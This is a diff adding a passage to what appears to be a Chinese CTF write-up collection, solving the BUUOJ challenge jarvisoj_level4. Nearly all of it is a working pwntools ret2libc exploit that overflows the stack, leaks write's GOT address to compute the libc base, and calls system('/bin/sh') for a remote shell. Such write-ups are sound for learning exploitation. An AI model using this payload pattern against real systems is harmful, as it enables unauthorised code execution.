@@ -944,3 +944,51 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### jarvisoj_level4
+
+[题目链接](https://buuoj.cn/challenges#jarvisoj_level4)
+
+这个题何意味啊，之前做个 level3，输入长度限制是 0x200，这个是 0x100，我还以为要栈迁移呢，找了找发现 bss 段小的可怜，仔细数了一下溢出，刚刚好能走 ret2libc，和 level3 一模一样，平凡。
+
+呃呃。
+
+```
+# written by Sonnety
+from pwn import *
+from LibcSearcher import *
+
+context(os = "linux",arch = "i386",log_level = "debug")
+
+host = "node5.buuoj.cn"
+port = 28791
+
+io = remote(host,port)
+# io = process("./level4")
+elf = ELF("./level4")
+libc = ELF("./libc-2.23.so")
+offset = 0x8c
+main_addr = elf.sym['main']    # main	08048484	
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+
+def main():
+    payload_1 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+    io.sendline(payload_1)
+    leak_data = io.recvn(4) 
+    write_addr = u32(leak_data)
+    print("\n[+] Leak write address:",hex(write_addr))
+    libc_base = write_addr - libc.sym['write']
+    system = libc_base + libc.sym['system']
+    binsh = libc_base + next(libc.search(b"/bin/sh"))
+    print("\n[+] Leak libc base address:",hex(libc_base))
+    print("\n[+] Leak system address:",hex(system))
+    print("\n[+] Leak binsh address:",hex(binsh))
+    payload_2 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+
+```
